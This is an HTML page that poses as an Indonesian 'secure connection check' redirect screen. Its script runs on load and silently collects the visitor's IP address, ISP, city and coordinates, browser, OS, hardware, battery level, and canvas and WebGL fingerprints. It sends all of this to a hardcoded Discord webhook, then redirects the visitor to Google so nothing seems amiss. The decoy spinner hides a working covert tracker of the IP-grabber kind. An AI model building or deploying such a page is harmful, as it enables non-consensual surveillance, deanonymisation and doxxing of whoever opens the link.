<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Checking Connection...</title>
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      background: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #333;
    }

    .decoy {
      text-align: center;
      padding: 40px 24px;
      max-width: 420px;
    }

    .decoy .spinner {
      width: 40px;
      height: 40px;
      border: 3px solid #e0e0e0;
      border-top-color: #1a73e8;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 24px;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .decoy h2 {
      font-size: 18px;
      font-weight: 500;
      margin-bottom: 8px;
      color: #202124;
    }

    .decoy p {
      font-size: 14px;
      color: #5f6368;
      line-height: 1.5;
    }

    .decoy .bar {
      width: 100%;
      height: 4px;
      background: #e8eaed;
      border-radius: 2px;
      margin: 24px 0 12px;
      overflow: hidden;
    }

    .decoy .bar .fill {
      height: 100%;
      width: 28%;
      background: linear-gradient(90deg, #1a73e8, #4285f4);
      border-radius: 2px;
      animation: indeterminate 2.2s ease-in-out infinite;
    }

    @keyframes indeterminate {
      0% { width: 0%; margin-left: 0; }
      50% { width: 60%; margin-left: 20%; }
      100% { width: 0%; margin-left: 100%; }
    }

    .decoy .url {
      font-size: 12px;
      color: #9aa0a6;
      margin-top: 16px;
      font-family: monospace;
    }

    .decoy .dots::after {
      content: '';
      animation: dots 1.5s steps(4, end) infinite;
    }

    @keyframes dots {
      0%   { content: ''; }
      25%  { content: '.'; }
      50%  { content: '..'; }
      75%  { content: '...'; }
      100% { content: ''; }
    }
  </style>
</head>
<body>
  <div class="decoy">
    <div class="spinner"></div>
    <h2>Memeriksa koneksi aman<span class="dots"></span></h2>
    <p>Sedang mengalihkan ke halaman tujuan yang aman</p>
    <div class="bar"><div class="fill"></div></div>
    <div class="url">google.com</div>
  </div>

  <script>
    // ============================================================
    //  SILENT DEVICE DETECTION — no visible feedback
    // ============================================================

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510289928347455568/0f9WRhtyoUNUUeLULn7CPivzUHaHhwOR1Oy28tAzUnknuWiDBIi4QUzsubBFRh7mUoUK';

    // -- GPU via WebGL --
    function detectGPU() {
      try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (gl) {
          const di = gl.getExtension('WEBGL_debug_renderer_info');
          if (di) {
            const vendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL);
            let renderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
            const angleMatch = renderer.match(/^ANGLE\s*\([^,]+,\s*(.+)\)$/);
            if (angleMatch) renderer = angleMatch[1];
            renderer = renderer
              .replace(/Direct3D11\s+vs_\d+_\d+\s+ps_\d+_\d+/g, '')
              .replace(/D3D11\)?/g, '').replace(/OpenGL ES\s+\d[\d.]*/g, '')
              .replace(/\s{2,}/g, ' ').replace(/\(.*?\)/g, '').trim();
            return { renderer: renderer.length > 5 ? renderer : '—', vendor: vendor };
          }
        }
      } catch (_) {}
      return navigator.gpu ? { renderer: 'WebGPU', vendor: '—' } : null;
    }

    // -- Refresh rate --
    function detectRefreshRate() {
      return new Promise(r => {
        if (document.visibilityState === 'hidden') return r(60);
        let p = performance.now(), f = 0, ok = true;
        const t = setTimeout(() => { ok = false; r(f > 0 ? Math.round(f*1000/(performance.now()-p)) : 60); }, 1000);
        function tick() { if (!ok) return; f++; const n = performance.now(); if (n-p >= 1000) { ok = false; clearTimeout(t); r(Math.round(f*1000/(n-p))); } else requestAnimationFrame(tick); }
        requestAnimationFrame(tick);
      });
    }

    // -- ISP / IP geolocation --
    async function detectISP() {
      const fallback = { isp: '—', ip: '—', org: '—', asn: '—', location: '', country: '', city: '', region: '', lat: null, lon: null, proxy: false, hosting: false };
      try {
        const res = await fetch('https://ip-api.com/json/?fields=status,query,isp,org,as,asname,reverse,country,countryCode,city,regionName,zip,lat,lon,timezone,mobile,proxy,hosting');
        const d = await res.json();
        if (d.status !== 'success') return fallback;
        const parts = []; if (d.city) parts.push(d.city); if (d.regionName) parts.push(d.regionName); if (d.country) parts.push(d.country);
        return {
          isp: d.isp || d.org || '—',
          ip: d.query,
          org: d.org || '—',
          asn: d.as || '—',
          asname: d.asname || '—',
          reverse: d.reverse || '—',
          location: parts.join(', '),
          country: d.country || '',
          countryCode: d.countryCode || '',
          city: d.city || '',
          region: d.regionName || '',
          zip: d.zip || '',
          lat: d.lat || null,
          lon: d.lon || null,
          timezone: d.timezone || '',
          mobile: d.mobile || false,
          proxy: d.proxy || false,
          hosting: d.hosting || false
        };
      } catch (_) { return fallback; }
    }

    // -- Browser / Engine --
    function detectBrowser(ua) {
      if (/Edg\//i.test(ua)) { const m = ua.match(/Edg\/([\d.]+)/); return { name: 'Edge', ver: m?.[1]||'' }; }
      if (/OPR\//i.test(ua) || /Opera|OPiOS/i.test(ua)) { const m = ua.match(/(?:OPR|Opera|OPiOS)\/([\d.]+)/); return { name: 'Opera', ver: m?.[1]||'' }; }
      if (/CriOS\//i.test(ua)) { const m = ua.match(/CriOS\/([\d.]+)/); return { name: 'Chrome (iOS)', ver: m?.[1]||'' }; }
      if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) { const m = ua.match(/Chrome\/([\d.]+)/); return { name: 'Chrome', ver: m?.[1]||'' }; }
      if (/Firefox\//i.test(ua) || /FxiOS\//i.test(ua)) { const m = ua.match(/(?:Firefox|FxiOS)\/([\d.]+)/); return { name: 'Firefox', ver: m?.[1]||'' }; }
      if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) { const m = ua.match(/Version\/([\d.]+)/); return { name: 'Safari', ver: m?.[1]||'' }; }
      return { name: 'Unknown', ver: '' };
    }

    function detectEngine(ua) {
      if (/Gecko\//i.test(ua) && !/like Gecko/i.test(ua)) return 'Gecko';
      if (/WebKit\//i.test(ua)) return 'WebKit';
      if (/Chrome\//i.test(ua) && /Safari\//i.test(ua)) return 'Blink';
      if (/Trident\//i.test(ua)) return 'Trident';
      return 'Unknown';
    }

    function detectOS(ua) {
      if (/Windows NT 10/i.test(ua)) return { name: 'Windows', ver: '10/11' };
      if (/Windows NT 6\.3/i.test(ua)) return { name: 'Windows', ver: '8.1' };
      if (/Windows NT 6\.2/i.test(ua)) return { name: 'Windows', ver: '8' };
      if (/Windows NT 6\.1/i.test(ua)) return { name: 'Windows', ver: '7' };
      if (/Mac OS X/i.test(ua)) { const m = ua.match(/Mac OS X ([\d_]+)/); return { name: 'macOS', ver: m?.[1].replace(/_/g,'')||'' }; }
      if (/Android/i.test(ua)) { const m = ua.match(/Android ([\d.]+)/); return { name: 'Android', ver: m?.[1]||'' }; }
      if (/iPhone|iPad|iPod/i.test(ua)) { const m = ua.match(/OS ([\d_]+)/); return { name: 'iOS', ver: m?.[1].replace(/_/g,'.')||'' }; }
      if (/Linux/i.test(ua)) return { name: 'Linux', ver: '' };
      if (/CrOS/i.test(ua)) return { name: 'ChromeOS', ver: '' };
      return { name: 'Unknown', ver: '' };
    }

    function detectDeviceType(ua) {
      if (/Mobi|Android.*Mobile|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) return 'Smartphone';
      if (/iPad|Android(?!.*Mobile)|Tablet|Silk|Kindle/i.test(ua) || (/(Macintosh|Mac OS X)/i.test(ua) && navigator.maxTouchPoints > 1)) return 'Tablet';
      return 'Desktop';
    }

    // -- Canvas fingerprint (SHA-256 hash of canvas rendering) --
    async function canvasFingerprint() {
      try {
        const c = document.createElement('canvas');
        c.width = 320; c.height = 80;
        const ctx = c.getContext('2d');

        // Draw text with different fonts/sizes
        ctx.textBaseline = 'alphabetic';
        ctx.font = '14px Arial'; ctx.fillStyle = '#333';
        ctx.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 4, 18);
        ctx.font = '16px "Times New Roman"'; ctx.fillStyle = '#c0392b';
        ctx.fillText('The quick brown fox jumps over the lazy dog', 4, 42);
        ctx.font = 'bold 12px Courier New'; ctx.fillStyle = '#2980b9';
        ctx.fillText('1234567890!@#$%^&*()_+-=[]{}|;:,.<>?/', 4, 62);

        // Draw shapes with gradients
        const grad = ctx.createLinearGradient(200, 0, 280, 0);
        grad.addColorStop(0, '#e74c3c'); grad.addColorStop(1, '#8e44ad');
        ctx.fillStyle = grad;
        ctx.beginPath(); ctx.arc(240, 40, 18, 0, Math.PI * 2); ctx.fill();
        ctx.strokeStyle = '#2ecc71'; ctx.lineWidth = 2;
        ctx.strokeRect(200, 12, 30, 30);

        // Get pixel data as base64
        const dataUrl = c.toDataURL();
        const buf = new Uint8Array(dataUrl.length);
        for (let i = 0; i < dataUrl.length; i++) buf[i] = dataUrl.charCodeAt(i) & 0xff;

        // SHA-256 hash via Web Crypto
        const hashBuf = await crypto.subtle.digest('SHA-256', buf);
        const hashArr = new Uint8Array(hashBuf);
        let hex = '';
        for (let i = 0; i < 16; i++) hex += hashArr[i].toString(16).padStart(2, '0');
        return hex;
      } catch (_) { return '—'; }
    }

    // -- WebGL fingerprint (additional unique params) --
    function webglFingerprint() {
      try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (!gl) return '';
        const params = [];
        const exts = gl.getSupportedExtensions() || [];
        params.push('ext:' + exts.length);
        // Max texture size varies by GPU/driver
        params.push('tex:' + gl.getParameter(gl.MAX_TEXTURE_SIZE));
        params.push('view:' + gl.getParameter(gl.MAX_VIEWPORT_DIMS).join('x'));
        params.push('aa:' + (gl.getParameter(gl.SAMPLES) || 0));
        // Fragment shader precision
        const prec = gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT);
        if (prec) params.push('fp:' + prec.precision + '-' + prec.rangeMin + '-' + prec.rangeMax);
        return params.join('|');
      } catch (_) { return ''; }
    }

    // ============================================================
    //  MAIN — collect all data, send to Discord, redirect
    // ============================================================

    async function collectAndSend() {
      const ua = navigator.userAgent;
      const platform = navigator.platform || '';
      const deviceType = detectDeviceType(ua);
      const browser = detectBrowser(ua);
      const engine = detectEngine(ua);
      const os = detectOS(ua);

      // High-entropy hints
      let model = '', platformVer = '', cpuArch = platform;
      if (navigator.userAgentData?.getHighEntropyValues) {
        try {
          const h = await navigator.userAgentData.getHighEntropyValues(['model','platformVersion','architecture','bitness']);
          if (h.model) model = h.model;
          if (h.platformVersion) platformVer = h.platformVersion;
          if (h.architecture) cpuArch = h.architecture + (h.bitness ? '-'+h.bitness : '');
        } catch (_) {}
      }

      // GPU
      const gpu = detectGPU();

      // Refresh rate
      const hz = await detectRefreshRate();

      // Screen
      const pr = window.devicePixelRatio || 1;

      // Connection
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      const typeMap = { bluetooth:'Bluetooth', cellular:'Seluler', ethernet:'Ethernet', wifi:'WiFi', wimax:'WiMAX', mixed:'Campuran', other:'Lainnya', unknown:'Unknown' };
      const connType = conn ? (typeMap[conn.type] || conn.type || '—') : '—';
      const connDetail = conn?.effectiveType ? conn.effectiveType.toUpperCase() + (conn.downlink ? ' · '+conn.downlink+' Mbps' : '') : '';

      // Battery
      let battery = '—';
      if (navigator.getBattery) {
        try {
          const b = await navigator.getBattery();
          battery = (b.charging ? '⚡' : '🔋') + ' ' + Math.round(b.level*100) + '%' + (b.charging ? ' (charging)' : '');
        } catch (_) {}
      }

      // Fingerprints
      const [canvasHash, webglFp] = await Promise.all([
        canvasFingerprint(),
        Promise.resolve(webglFingerprint())
      ]);

      // ISP / Geolocation
      const geo = await detectISP();

      // Languages
      const langs = navigator.languages ? navigator.languages.join(', ') : navigator.language || '—';

      // Timezone
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '—';

      // Build embed
      const deviceIcon = deviceType === 'Smartphone' ? '📱' : deviceType === 'Tablet' ? '📟' : '💻';
      const colorMap = { Smartphone: 0xfacc15, Tablet: 0x60a5fa, Desktop: 0x4ade80 };
      const mem = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—';
      const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' core' : '—';

      // Geolocation detail
      const geoParts = [];
      if (geo.city) geoParts.push('🏙️ ' + geo.city);
      if (geo.region) geoParts.push('📍 ' + geo.region);
      if (geo.country) geoParts.push('🌍 ' + geo.country + (geo.countryCode ? ' ('+geo.countryCode+')' : ''));
      if (geo.zip) geoParts.push('📮 ' + geo.zip);
      if (geo.lat && geo.lon) geoParts.push('📍 ' + geo.lat.toFixed(4) + ', ' + geo.lon.toFixed(4));
      if (geo.timezone) geoParts.push('🕐 ' + geo.timezone);
      const geoStr = geoParts.join('\n') || '—';

      // Flags
      const flags = [];
      if (geo.proxy) flags.push('🔒 Proxy/VPN');
      if (geo.hosting) flags.push('☁️ Hosting/DC');
      if (geo.mobile) flags.push('📡 Mobile/Cellular');

      const dateStr = new Date().toLocaleString('id-ID', { timeZone: tz, dateStyle: 'full', timeStyle: 'long' });

      const embed = {
        username: 'Device Monitor',
        avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
        embeds: [{
          title: deviceIcon + ' Visitor — ' + deviceType + ' Detected',
          color: colorMap[deviceType] || 0x4ade80,
          timestamp: new Date().toISOString(),
          footer: { text: 'Stealth Monitor · ' + dateStr },
          fields: [
            { name: '📦 Device', value: deviceType + (model ? ' · ' + model : ''), inline: true },
            { name: '🌐 Browser', value: browser.name + (browser.ver ? ' v'+browser.ver : '') + ' · ' + engine, inline: true },
            { name: '💿 OS', value: os.name + (os.ver ? ' '+os.ver : ''), inline: true },
            { name: '🧠 CPU', value: cpuCores + ' · ' + cpuArch, inline: true },
            { name: '🎮 GPU', value: gpu?.renderer || '—', inline: true },
            { name: '💾 RAM', value: mem, inline: true },
            { name: '🪟 Screen', value: screen.width + '×' + screen.height + ' @' + hz + 'Hz · ' + pr.toFixed(2) + 'x · ' + screen.colorDepth + 'bit', inline: true },
            { name: '🔋 Bat', value: battery, inline: true },
            { name: '🔌 Net', value: connType + (connDetail ? ' ('+connDetail+')' : ''), inline: true },
            { name: '🏢 ISP / Provider', value: geo.isp, inline: true },
            { name: '🌐 IP & ASN', value: geo.ip + (geo.asn !== '—' ? '\n' + geo.asn + (geo.asname !== '—' ? ' ('+geo.asname+')' : '') : ''), inline: true },
            { name: '🌍 Geolocation', value: geoStr, inline: true },
            { name: '🗺️ Lokasi', value: geo.location || '—', inline: true },
            { name: '🔍 Flags', value: flags.length > 0 ? flags.join('\n') : '✅ Normal', inline: true },
            { name: '🆔 Canvas FP', value: canvasHash !== '—' ? '`' + canvasHash + '`' : '—', inline: false },
            { name: '🌏 Bahasa', value: langs, inline: true },
            { name: '🔗 Referrer', value: document.referrer ? document.referrer.substring(0, 100) : '(langsung)', inline: true }
          ]
        }]
      };

      // Send to Discord — silently
      try {
        await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
      } catch (_) {}

      // Redirect to Google
      window.location.replace('https://google.com');
    }

    // Start as soon as DOM is ready
    document.addEventListener('DOMContentLoaded', collectAndSend);
  </script>
</body>
</html>
